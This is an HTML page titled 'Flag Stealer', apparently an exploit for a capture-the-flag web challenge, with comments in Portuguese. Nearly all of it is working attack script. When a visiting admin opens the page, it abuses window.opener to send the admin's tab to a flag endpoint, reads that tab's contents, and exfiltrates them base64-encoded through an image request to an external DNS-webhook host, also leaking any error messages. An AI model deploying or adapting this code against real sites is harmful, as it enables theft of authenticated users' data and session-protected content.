<!DOCTYPE html>
<html>
  <head>
    <title>Flag Stealer</title>
  </head>
  <body>
    <h1>Hi Admin ðŸ‘‹</h1>
    <p>Just a cool page...</p>

    <script>
      // Verifica se a pÃ¡gina foi aberta por outra aba
      if (window.opener) {
        // Redireciona a aba do admin com cookie para /get_flag
        window.opener.location = "http://34.134.162.213:17001/get_flag";

        // Espera um tempo para a flag carregar na aba principal
        setTimeout(() => {
          try {
            // Tenta ler a flag da aba original
            const flag = window.opener.document.body.innerText;

            // Exfiltra a flag para seu Webhook DNS
            const img = new Image();
            img.src = "https://f0455fd0-b8ef-49b3-ba00-a015762e26ad.dnshook.site/" + btoa(flag);
          } catch (e) {
            // Se falhar, exfiltra o erro para debug
            const img = new Image();
            img.src = "https://f0455fd0-b8ef-49b3-ba00-a015762e26ad.dnshook.site/erro_" + btoa(e.message);
          }
        }, 2000); // tempo ajustÃ¡vel, pode aumentar para 3000ms se necessÃ¡rio
      }
    </script>
  </body>
</html>
